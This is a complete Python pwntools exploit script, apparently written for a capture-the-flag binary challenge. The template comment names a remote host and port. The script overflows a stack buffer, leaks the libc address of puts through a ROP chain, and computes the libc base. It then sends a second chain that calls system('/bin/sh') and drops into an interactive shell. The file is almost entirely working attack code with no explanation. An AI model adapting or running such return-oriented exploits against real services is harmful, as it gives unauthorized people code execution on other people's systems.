#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '/home/jacute/Загрузки/sptr' --host 109.233.56.90 --port 11600
import time
from ctypes import CDLL
from Crypto.Util.number import bytes_to_long, long_to_bytes

from pwn import *
import re
import time

# for local
# exe = context.binary = ELF('../mafioznik')

# def start_local(argv=[], *a, **kw):
#     '''Execute the target binary locally'''
#     if args.GDB:
#         return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
#     elif args.EDB:
#         return process(['edb', '--run', exe.path] + argv, *a, **kw)
#     else:
#         return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

host = args.HOST or 'localhost'
port = int(args.PORT or 5252)

# === EXPLOIT ===

# get libc base
io = start()

SYSTEM_LIBC_OFFSET = 0x50d70
PUTS_LIBC_OFFSET = 0x80e50
BIN_SH_LIBC_OFFSET = 0x1d8678

GADGET_ADDR = 0x4011a5 # pop rdi; ret
GADGET_STACK_ALIGNMENT_ADDR = 0x40101a # ret
PUTS_GOT_PLT_ADDR = 0x404018
PUTS_PLT_SEC_ADDR = 0x401070

io.recvline()

buf = b"A" * 48 # buf
buf += b"B" * 8 # RBP
buf += p64(GADGET_ADDR)
buf += p64(PUTS_GOT_PLT_ADDR)
buf += p64(PUTS_PLT_SEC_ADDR)

io.sendline(buf)


PUTS_LIBC_ADDR = bytes_to_long(io.recvline()[:-1][::-1])

LIBC_ADDR = PUTS_LIBC_ADDR - PUTS_LIBC_OFFSET

# exec system
io = start()

io.recvline()

# put /bin/sh in RDI
buf = b"A" * 48 # buf
buf += b"B" * 8 # RBP
buf += p64(GADGET_ADDR)
buf += p64(LIBC_ADDR + BIN_SH_LIBC_OFFSET)

# stack alignment
buf += p64(GADGET_STACK_ALIGNMENT_ADDR)
buf += p64(LIBC_ADDR + SYSTEM_LIBC_OFFSET)
buf += b"A" * 8

io.sendline(buf)

io.interactive()
